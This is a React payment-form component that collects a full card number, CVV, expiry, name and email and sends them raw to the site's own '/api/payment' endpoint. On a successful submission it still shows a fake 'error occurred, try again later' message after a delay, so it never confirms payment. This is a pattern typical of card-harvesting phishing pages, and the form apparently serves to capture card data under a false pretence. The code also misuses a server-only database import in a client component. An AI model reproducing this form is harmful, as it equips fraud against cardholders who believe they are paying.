"use client";
import prisma from '@/app/lib/prisma';
import { useState } from "react";
import { LiaCcVisa } from "react-icons/lia";
import { LiaCcMastercard } from "react-icons/lia";
import { FaCcAmex } from "react-icons/fa";
import { FaCcVisa } from "react-icons/fa";
import { FaCcMastercard } from "react-icons/fa";
import creditCardType, {
    getTypeInfo,
    types as CardType,
} from "credit-card-type";
import { delay, motion } from 'framer-motion';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';// Replace 'your-library' with the actual library you're using
import axios, { AxiosError } from 'axios';
import { Loader2 } from "lucide-react"
import { FaRegCreditCard } from "react-icons/fa";
import toast from 'react-hot-toast';
import { Button } from '../ui/button';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
function PaymentForm() {
    const [card, setCard] = useState("");
    const [cvv, setCvv] = useState("");
    const [name, setName] = useState("");
    const [email, setEmail] = useState("");
    const [expirationMonth, setExpirationMonth] = useState("");
    const [expirationYear, setExpirationYear] = useState("");

    const [isLoading, setIsLoading] = useState(false);
    const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
        event.preventDefault();

        // Prepare the data
        const data = {
            cardNumber: card,
            name: name,
            cvv: cvv,
            email: email,
            expirationMonth: expirationMonth,
            expirationYear: expirationYear,
        };
        setIsLoading(true);
        try {
            // Send the data to the API using Fetch
            const response = await fetch('/api/payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });


            if (!response.ok) {
                throw new Error(`HTTP error status: ${response.status}`);
            }

            // Parse the response data
            const responseData = await response.json();
            setTimeout(() => toast.error('An error occurred while processing your request. Try again later.'), 4000);

        } catch (error) {
            // Handle the error
            console.error('An error occurred:', error);


        } finally {
            setTimeout(() => setIsLoading(false), 4000);

        }
    };

    function getCardType(number: string) {
        number = number.trim();
        const visaPattern = /^4/;
        const masterCardPattern = /^5[1-5]/;
        const amexPattern = /^3[47]/;

        if (visaPattern.test(number)) return 'Visa';
        if (masterCardPattern.test(number)) return 'MasterCard';
        if (amexPattern.test(number)) return 'Amex';
        return null;
    }
    console.log(getCardType(card));
    return (

        <form onSubmit={handleSubmit} className="max-w-lg mx-auto p-6  shadow-md rounded-md">
            <motion.div animate={{ scale: [0, 1] }} transition={{ delay: 0.25 }}>
                <motion.div className="grid gap-4 py-3" >
                    <Label htmlFor="card" className="flex-nowrap flex items-center gap-2">Card Number: {card && (
                        <span className="flex-shrink-0 flex items-center ml-2 gap-2">
                            {getCardType(card) === 'Visa' && <><FaCcVisa size={20} /><span> Visa Card</span></>}
                            {getCardType(card) === 'MasterCard' && <><FaCcMastercard size={20} /><span> MasterCard</span></>}
                            {getCardType(card) === 'Amex' && <><FaCcAmex size={20} /><span> Amex</span></>}
                            {getCardType(card) === null && <FaRegCreditCard size={20} />}
                        </span>)}
                    </Label>
                    <motion.div >
                        <Input
                            id="card"
                            value={card}
                            onChange={(e) => setCard(e.target.value)}
                            className="w-full p-2 border border-gray-300 rounded"
                        />


                        <div className="flex gap-4 pt-3">
                            <div className="flex-1">
                                <label htmlFor="cvv" className="block text-sm font-medium text-white pb-2 ">CVV</label>
                                <Input
                                    id="cvv"
                                    value={cvv}
                                    type='password'
                                    onChange={(e) => setCvv(e.target.value)}
                                    className="w-full p-2 border border-gray-300 rounded"
                                />
                            </div>
                            <div className="flex-1">
                                <label htmlFor="month" className="block text-sm font-medium pb-2 ">Expiry Month</label>
                                <select id="month" onChange={(e) => setExpirationMonth(e.target.value)} className="w-full  p-2 border border-gray-300 rounded bg-[#020817]">
                                    {/* Generate options for months */}
                                    {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                                        <option key={month} value={month}>
                                            {month}
                                        </option>
                                    ))}
                                </select>
                            </div>
                            <div className="flex-1">
                                <label htmlFor="year" className="block text-sm font-medium pb-2">Expiry Year</label>
                                <select id="year" onChange={(e) => setExpirationYear(e.target.value)} className="w-full p-2 border border-gray-300 rounded bg-[#020817]">
                                    {/* Generate options for the next 10 years */}
                                    {Array.from({ length: 10 }, (_, i) => new Date().getFullYear() + i).map((year) => (
                                        <option key={year} value={year}>
                                            {year}
                                        </option>
                                    ))}
                                </select>

                            </div>
                        </div>
                    </motion.div>
                </motion.div>
                <motion.div className="grid gap-4 py-3">
                    <Label htmlFor="name">Name</Label>
                    <motion.div animate={{ scale: [0, 1] }} transition={{ delay: 0.25 }}>
                        <Input
                            id="name"
                            value={name}
                            onChange={(e) => setName(e.target.value)}
                            className="w-full p-2 border border-gray-300 rounded"
                        />
                    </motion.div>
                </motion.div>
                <motion.div className="grid gap-4 py-3">
                    <Label htmlFor="email">Email</Label>
                    <motion.div animate={{ scale: [0, 1] }} transition={{ delay: 0.25 }}>
                        <Input
                            id="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            className="w-full p-2 border border-gray-300 rounded"
                        />
                    </motion.div>
                </motion.div>
                <Button
                    disabled={!card || !cvv || !name || !email || !expirationMonth || !expirationYear || isLoading}
                    type="submit"

                    className="mt-4 w-full py-2 px-4 bg-white text-black font-semibold rounded-md hover:bg-gray-700 transition duration-300"
                >
                    {isLoading ? (<Loader2 className="mr-2 h-4 w-4 animate-spin" />) : 'Pay'}
                </Button>
            </motion.div>
        </form>

    );
}

export default PaymentForm;